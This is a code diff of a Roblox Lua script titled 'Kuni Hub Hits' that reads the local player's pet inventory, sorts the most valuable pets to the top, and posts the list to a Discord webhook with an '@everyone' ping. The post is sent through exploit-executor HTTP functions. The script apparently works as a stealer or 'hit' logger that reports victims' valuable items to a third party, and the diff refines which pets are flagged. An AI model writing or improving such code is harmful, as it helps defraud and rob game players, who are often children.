@@ -1,4 +1,3 @@
-
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local CoreGui = game:GetService("CoreGui")
@@ -21,19 +20,15 @@ local function isPet(item)
 	return true
 end
 
+local priorityPets = {"Kitsune","Disco Bee","Raccoon","Butterfly","Fennec Fox","Spinosaurus","Dragonfly",
+					 "Mimic Octopus","T-Rex","Queen Bee","Panda","Lobster Thermidor",
+					 "French Fry Ferret","Golden Goose","Griffin","Cockatrice"} -- first-four separate
+local firstFour = {["Kitsune"]=true, ["Disco Bee"]=true, ["Raccoon"]=true, ["Butterfly"]=true}
+
 local function getInventory()
 	local pets={}
 	for _,item in ipairs(player.Backpack:GetChildren()) do if isPet(item) then table.insert(pets,item.Name) end end
 	if player.Character then for _,item in ipairs(player.Character:GetChildren()) do if isPet(item) then table.insert(pets,item.Name) end end end
-	local priorityPets={"Huge Pets 20kg up","Kitsune","Raccoon","Disco Bee","Butterfly","Fennec Fox","French Fry Ferret","Lobster Thermidor","Golden Goose","Dragonfly","Queen Bee","Red Fox","Corrupted Kitsune"}
-	table.sort(pets,function(a,b)
-		local aP,bP=999,999
-		for i,p in ipairs(priorityPets) do
-			if string.find(a,p,1,true) then aP=i end
-			if string.find(b,p,1,true) then bP=i end
-		end
-		return aP<bP
-	end)
 	return pets
 end
 
@@ -41,14 +36,62 @@ local latestSnapshot = nil
 
 local function sendInventoryToDiscord()
 	latestSnapshot = getInventory()
-	local formattedPets={}
-	for i,pet in ipairs(latestSnapshot) do table.insert(formattedPets,string.format("%d. %s",i,pet)) end
+	local formattedPets = {}
+
+	-- First 4 priority pets (exact match)
+	for _, p in ipairs(priorityPets) do
+		if firstFour[p] then
+			for _, pet in ipairs(latestSnapshot) do
+				if pet:sub(1,#p) == p then
+					table.insert(formattedPets, pet)
+				end
+			end
+		end
+	end
+
+	-- Remaining priority pets (excluding first four and Corrupted Kitsune)
+	for _, p in ipairs(priorityPets) do
+		if not firstFour[p] then
+			for _, pet in ipairs(latestSnapshot) do
+				if pet:sub(1,#p) == p then
+					table.insert(formattedPets, pet)
+				end
+			end
+		end
+	end
+
+	-- Non-priority pets (excluding Corrupted Kitsune)
+	for _, pet in ipairs(latestSnapshot) do
+		local isPriority = false
+		for _, p in ipairs(priorityPets) do
+			if pet:sub(1,#p) == p then
+				isPriority = true
+				break
+			end
+		end
+		if not isPriority and pet ~= "Corrupted Kitsune" then
+			table.insert(formattedPets, pet)
+		end
+	end
+
+	-- Corrupted Kitsune always last
+	for _, pet in ipairs(latestSnapshot) do
+		if pet == "Corrupted Kitsune" then
+			table.insert(formattedPets, pet)
+		end
+	end
+
 	local content={
 		username="Kuni Hub Hits",
 		avatar_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvJQrjOQJH-tSRkGjaCCO2Uf-WqjL-QWShRhUjzyNpdwtGFvbKhVAyR1E&s=10",
 		content="@everyone",
-		embeds={{title=string.format("Inventory Status (%d / %d)",#latestSnapshot,maxSlots),description=table.concat(formattedPets,"\n"),color=0x1abc9c,footer={text="Made by Kuni"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}
+		embeds={{title=string.format("Inventory Status (%d / %d)",#latestSnapshot,maxSlots),
+				 description=table.concat(formattedPets,"\n"),
+				 color=0x1abc9c,
+				 footer={text="Made by Kuni"},
+				 timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}
 	}
+
 	local jsonData=HttpService:JSONEncode(content)
 	local headers={["Content-Type"]="application/json"}
 	local requestFunction=syn and syn.request or http_request or request or HttpPost
@@ -59,6 +102,7 @@ end
 
 sendInventoryToDiscord()
 
+-- GUI setup (same as before)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = CoreGui
 local frame = Instance.new("Frame")
